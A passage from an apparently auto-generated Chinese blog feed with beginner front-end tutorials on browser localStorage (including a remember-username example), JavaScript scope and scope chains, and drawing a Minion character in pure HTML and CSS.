class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;input type=<span class="string">"text"</span>&gt;</span><br><span class="line">    &lt;button <span class="class"><span class="keyword">class</span></span>=<span class="string">"set"</span>&gt;存储数据&lt;<span class="regexp">/button&gt;</span></span><br><span class="line"><span class="regexp">    &lt;button class="get"&gt;获取数据&lt;/</span>button&gt;</span><br><span class="line">    &lt;button <span class="class"><span class="keyword">class</span></span>=<span class="string">"remove"</span>&gt;删除数据&lt;<span class="regexp">/button&gt;</span></span><br><span class="line"><span class="regexp">    &lt;button class="del"&gt;清除所有数据&lt;/</span>button&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        <span class="keyword">var</span> ipt = <span class="built_in">document</span>.querySelector(<span class="string">'input'</span>);</span><br><span class="line">        <span class="keyword">var</span> <span class="keyword">set</span> = document.querySelector('.<span class="keyword">set</span>');</span><br><span class="line">        var <span class="keyword">get</span> = document.querySelector('.<span class="keyword">get</span>');</span><br><span class="line">        var re = document.querySelector('.remove');</span><br><span class="line">        var del = document.querySelector('.del');</span><br><span class="line">        <span class="keyword">set</span>.addEventListener('click', function () &#123;</span><br><span class="line">            <span class="comment">//当点击之后就把输入框里面的值存储起来</span></span><br><span class="line">            <span class="keyword">var</span> val = ipt.value;</span><br><span class="line">            localStorage.setItem(<span class="string">'onekingcc'</span>,val);</span><br><span class="line">            localStorage.setItem(<span class="string">'ni'</span>,val);</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="comment">//获取数据</span></span><br><span class="line">        <span class="keyword">get</span>.addEventListener('click',function() &#123;</span><br><span class="line">            <span class="comment">// localStorage.getItem('onekingcc')</span></span><br><span class="line">            <span class="built_in">console</span>.log( localStorage.getItem(<span class="string">'onekingcc'</span>));</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="comment">// 移除数据</span></span><br><span class="line">        re.addEventListener(<span class="string">'click'</span>,<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="comment">// sessionStorage.getItem('onekingcc')</span></span><br><span class="line">            localStorage.removeItem(<span class="string">'onekingcc'</span>);</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="comment">//删除所有数据</span></span><br><span class="line">        del.addEventListener(<span class="string">'click'</span>,<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            localStorage.clear();</span><br><span class="line">        &#125;);</span><br><span class="line">    </span><br><span class="line">    &lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><h4 id="记住密码案例"><a href="#记住密码案例" class="headerlink" title="记住密码案例"></a>记住密码案例</h4><ol><li><p>把数据存储起来使用本地存储关闭页面可以显示用户名，所以用到localStrage</p></li><li><p>打开页面首先判断是否有这个用户名，如果有就在表单里面显示用户名，并且勾选复选框</p></li><li><p>当复选框发生改变时，使用change事件</p></li><li><p>如果勾选，就存储，否则就移除</p></li></ol></li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;input type=<span class="string">"text"</span> id=<span class="string">"username"</span>&gt;记住用户&lt;input type=<span class="string">"checkbox"</span> name = <span class="string">""</span>id=<span class="string">"remeber"</span>&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">    <span class="keyword">var</span> username = <span class="built_in">document</span>.querySelector(<span class="string">"#username"</span>);</span><br><span class="line">    <span class="keyword">var</span> checkbox = <span class="built_in">document</span>.querySelector(<span class="string">"#remeber"</span>);</span><br><span class="line">    <span class="keyword">if</span>(localStorage.getItem(<span class="string">'username'</span>))&#123;</span><br><span class="line">        username.value = localStorage.getItem(<span class="string">'username'</span>);</span><br><span class="line">        remeber.checkbox = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    remeber.addEventListener(<span class="string">'change'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">this</span>.checked)&#123;</span><br><span class="line">            localStorage.setItem(<span class="string">'username'</span>,username.value);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            localStorage.removeItem(<span class="string">'username'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    &lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;本地存储&quot;&gt;&lt;a href=&quot;#本地存储&quot; class=&quot;headerlink&quot; title=&quot;本地存储&quot;&gt;&lt;/a&gt;本地存储&lt;/h4&gt;&lt;p&gt;​    1. 数据存储在用户浏览器中&lt;/p&gt;
&lt;p&gt;​    2. 设置，读取方便，页面刷新不会丢失数据&lt;/p&gt;
&lt;p&gt;​
      
    
    </summary>
    
      <category term="前端" scheme="http://onekingcc.github.io/categories/%E5%89%8D%E7%AB%AF/"/>
    
    
      <category term="javascript" scheme="http://onekingcc.github.io/tags/javascript/"/>
    
  </entry>
  
  <entry>
    <title>浅谈js里面的作用域与作用域链</title>
    <link href="http://onekingcc.github.io/2019/07/16/README/"/>
    <id>http://onekingcc.github.io/2019/07/16/README/</id>
    <published>2019-07-16T14:37:46.074Z</published>
    <updated>2019-08-11T14:59:24.680Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>感觉JavaScript里面的有些东西有趣但是有时候又有点不理解，有时候只是简单的用一下今天看了一下手册发现自己理解的还是有些偏差所以将自己所理解的记录下来！<a id="more"></a></p><h3 id="什么是作用域"><a href="#什么是作用域" class="headerlink" title="什么是作用域"></a>什么是作用域</h3><p>我理解的就是在一定区域内起作用的区域。</p><h3 id="全局作用域"><a href="#全局作用域" class="headerlink" title="全局作用域"></a>全局作用域</h3><p>js的作用域是全局的，在代码的任何地方都有定义，都能使用</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="number">10</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"> <span class="keyword">var</span> a =<span class="number">12</span>;</span><br><span class="line">    <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(show());<span class="comment">//12</span></span><br></pre></td></tr></table></figure><p>这里的a加在了什么地方了呢，其实这个a是加在了全局对象window上面我们可以看一下是不是</p><p><img src="/images/zuoyongyu/1563280204559.png" alt="1563280204559"></p><p>这里可以看到返回了true，这里说明在声明局部变量时要使用var,否则这里的解释器会将该变量变为全局对象window的属性。</p><h3 id="函数作用域"><a href="#函数作用域" class="headerlink" title="函数作用域"></a>函数作用域</h3><p>函数作用域说明只在函数内起作用</p><p><img src="/images/zuoyongyu/1563280978444.png" alt="1563280978444"></p><p>这里看到这里的<code>num</code>是not define，这里要注意一点的就是这里的变量作用域不同于java c++的编程语言，这里的<code>var</code>很容易造成误会，举个例子：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>;i&lt;<span class="number">5</span>;i++)&#123;</span><br><span class="line"><span class="keyword">var</span> num = <span class="number">10</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(num);<span class="comment">//10</span></span><br></pre></td></tr></table></figure><p><img src="/images/zuoyongyu/1563281510785.png" alt="1563281510785"></p><p>可以发现输出了10，num这个对象是在块级里面包裹的但是还是输出了10，这就说明跟传统的java ，C++在块级起作用是不一样的，如果我想要它在这个块级起作用该怎么做呢？</p><p><img src="/images/zuoyongyu/1563282145312.png" alt="1563282145312"></p><p>这里发现我们加了let让num起作用了，let是在Es6中只要用let所声明的变量，只在let命令所在的代码块有效。</p><h3 id="作用域链"><a href="#作用域链" class="headerlink" title="作用域链"></a>作用域链</h3><p>什么是作用域链呢？子级没有的去让父级去查找。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="number">111</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"> <span class="keyword">var</span> a = <span class="number">10</span>;</span><br><span class="line">    show1();</span><br><span class="line">&#125;<span class="function"><span class="keyword">function</span> <span class="title">show1</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(a);</span><br><span class="line">&#125;</span><br><span class="line">show();</span><br></pre></td></tr></table></figure><p>如果没有真正理解那句话很容易就会得10，看到父函数里面show1()的调用，然后子函数没有的就找父级，嗯没错啊10呢，但是结果是111</p><p><img src="/images/zuoyongyu/1563283414163.png" alt="1563283414163"></p><p>这里的父级跟在哪执行没有关系，而是根据它物理的位置有关系，什么意思看一下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="number">111</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"> <span class="keyword">var</span> a = <span class="number">10</span>;</span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">show1</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(a);</span><br><span class="line">&#125;</span><br><span class="line">    show1();</span><br><span class="line">&#125;</span><br><span class="line">show();</span><br></pre></td></tr></table></figure><p><img src="/images/zuoyongyu/1563283840302.png" alt="1563283840302"></p><p>这里我们发现这时候就是我们得到想要的值，子函数没有的就在父函数里面找，这就是在函数里面嵌套的，所以为什么说跟它物理位置有关。</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;感觉JavaScript里面的有些东西有趣但是有时候又有点不理解，有时候只是简单的用一下今天看了一下手册发现自己理解的还是有些偏差所以将自己所理解的记录下来！&lt;/p&gt;
    
    </summary>
    
      <category term="前端" scheme="http://onekingcc.github.io/categories/%E5%89%8D%E7%AB%AF/"/>
    
    
      <category term="javascript" scheme="http://onekingcc.github.io/tags/javascript/"/>
    
  </entry>
  
  <entry>
    <title>纯html+css画出小黄人</title>
    <link href="http://onekingcc.github.io/2019/07/14/%E7%BA%AFhtml+css%E7%94%BB%E5%87%BA%E5%B0%8F%E9%BB%84%E4%BA%BA/"/>
    <id>http://onekingcc.github.io/2019/07/14/纯html+css画出小黄人/</id>
    <published>2019-07-14T15:07:50.902Z</published>
    <updated>2019-08-11T14:38:39.183Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>这里是为了巩固这几天学的知识所以决定写这个小案例，这里简单说一下 <a id="more"></a></p><p>首先定义个div的容器来包裹小黄人，然后 再定义一个小黄人的容器，把身体的各个部位放进去就可以。再写<code>css</code>的时候还是遇到了一些问题，不过还是学到了很多的东西的，这里首先把我的结构放出来。</p><h3 id="整体结构"><a href="#整体结构" class="headerlink" title="整体结构"></a>整体结构</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>mini<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 容器 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 小黄人 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"minior"</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 身体 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"body"</span>&gt;</span></span><br><span class="line">                <span class="comment">&lt;!-- 裤子 --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"trousers"</span>&gt;</span></span><br><span class="line">                    <span class="comment">&lt;!-- 吊带 --&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"belt"</span>&gt;</span></span><br><span class="line">                        <span class="comment">&lt;!-- 左边 --&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"left"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                        <span class="comment">&lt;!-- 右边 --&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"right"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                     <span class="comment">&lt;!-- 裤子左边突出矩形部分 --&gt;</span></span><br><span class="line">                     <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"trousers_top"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                     <span class="comment">&lt;!-- 裤袋部分 --&gt;</span></span><br><span class="line">                     <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"packets"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                     <span class="comment">&lt;!-- 三条线 --&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"line-left"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"line-right"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"line-bottom"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span>         </span><br><span class="line">            </span><br><span class="line">               <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 头发 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"hair"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"hair_left"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"hair_right"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 眼睛 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"eyes"</span>&gt;</span></span><br><span class="line">                <span class="comment">&lt;!-- 左眼 --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"left_eye"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"left_black_eye"</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"left_white"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                            </span><br><span class="line">                        </span><br><span class="line">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="comment">&lt;!-- 右眼 --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"right"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"right_black_eye"</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"right_white"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 嘴巴 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"mouth"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"mouth_shap"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 双手 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"hands"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"left_hand"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"right_hand"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 双脚 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"foot"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"left_foot"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"right_foot"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 脚底阴影 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"groundshadw"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">body</span>&#123;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.container</span>&#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">300px</span>;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">100px</span> auto;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.minior</span>&#123;</span><br><span class="line">    <span class="attribute">position</span>: relative;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.body</span>&#123;</span><br><span class="line">    <span class="attribute">position</span>: absolute;</span><br><span class="line"><span class="attribute">width</span>: <span class="number">240px</span>;</span><br><span class="line"><span class="attribute">height</span>: <span class="number">400px</span>;</span><br><span class="line"><span class="attribute">border</span>: <span class="number">5px</span> solid <span class="number">#000</span>;</span><br><span class="line"><span class="attribute">border-radius</span>: <span class="number">115px</span>;</span><br><span class="line"><span class="attribute">background</span>: <span class="built_in">rgb</span>(249, 217, 70);</span><br><span class="line"><span class="attribute">overflow</span>: hidden;</span><br><span class="line">    <span class="attribute">z-index</span>: <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/mini/1563110236095.png" alt="1563110236095"></p><p>这里.<code>body</code>就是绘制小黄人的身体，然后这里用到了用z-index这里设置的堆叠顺序，如果拥有更高堆叠顺序的元素总是会处于堆叠顺序较低的元素的前面。现在身体已经有了，接下来就是画裤子了。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.body</span> <span class="selector-class">.trousers</span> &#123;</span><br><span class="line"><span class="attribute">position</span>: absolute;</span><br><span class="line"><span class="attribute">bottom</span>: <span class="number">0</span>;</span><br><span class="line"><span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line"><span class="attribute">height</span>: <span class="number">100px</span>;</span><br><span class="line"><span class="attribute">border-top</span>: <span class="number">6px</span> solid <span class="number">#000</span>;</span><br><span class="line"><span class="attribute">background</span>: <span class="built_in">rgb</span>(32, 116, 160);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/mini/1563110791312.png" alt="1563110791312"></p><p>总感觉少了点啥好像还差点，这怎么看都像一个药丸，继续写</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.trousers_top</span> &#123;</span><br><span class="line"><span class="attribute">width</span>: <span class="number">160px</span>;</span><br><span class="line"><span class="attribute">height</span>: <span class="number">60px</span>;</span><br><span class="line"><span class="attribute">border</span>: <span class="number">6px</span> solid <span class="number">#000</span>;</span><br><span class="line"><span class="attribute">border-bottom</span>: none;</span><br><span class="line"><span class="attribute">border-radius</span>: <span class="number">0</span> <span class="number">0</span> <span class="number">5px</span> <span class="number">5px</span>;</span><br><span class="line"><span class="attribute">background</span>: <span class="built_in">rgb</span>(32, 116, 160);</span><br><span class="line"><span class="attribute">position</span>: absolute;</span><br><span class="line"><span class="attribute">bottom</span>: <span class="number">100px</span>;</span><br><span class="line"><span class="attribute">left</span>: <span class="number">34px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/mini/1563110979099.png" alt="1563110979099"></p><p>emmm感觉还是差点，得把吊带这些都画好</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.body</span> <span class="selector-class">.belt</span> <span class="selector-class">.left</span>,</span><br><span class="line"><span class="selector-class">.body</span> <span class="selector-class">.belt</span> <span class="selector-class">.right</span> &#123;</span><br><span class="line"><span class="attribute">width</span>: <span class="number">100px</span>;</span><br><span class="line"><span class="attribute">height</span>: <span class="number">16px</span>;</span><br><span class="line"><span class="attribute">border</span>: <span class="number">5px</span> solid <span class="number">#000</span>;</span><br><span class="line"><span class="attribute">background</span>: <span class="built_in">rgb</span>(32, 116, 160);</span><br><span class="line"><span class="attribute">position</span>: absolute;</span><br><span class="line"><span class="attribute">top</span>: -<span class="number">90px</span>;</span><br><span class="line"><span class="attribute">left</span>: -<span class="number">35px</span>;</span><br><span class="line"><span class="attribute">z-index</span>: <span class="number">2</span>;</span><br><span class="line"><span class="attribute">transform</span>: <span class="built_in">rotate</span>(45deg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.body</span> <span class="selector-class">.belt</span> <span class="selector-class">.left</span> &#123;</span><br><span class="line"><span class="attribute">top</span>: -<span class="number">88px</span>;</span><br><span class="line"><span class="attribute">left</span>: <span class="number">165px</span>;</span><br><span class="line"><span class="attribute">transform</span>: <span class="built_in">rotate</span>(-45deg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.body</span> <span class="selector-class">.belt</span> <span class="selector-class">.left</span><span class="selector-pseudo">:after</span>,</span><br><span class="line"><span class="selector-class">.body</span> <span class="selector-class">.belt</span> <span class="selector-class">.right</span><span class="selector-pseudo">:after</span> &#123;</span><br><span class="line"><span class="attribute">content</span>: <span class="string">''</span>;</span><br><span 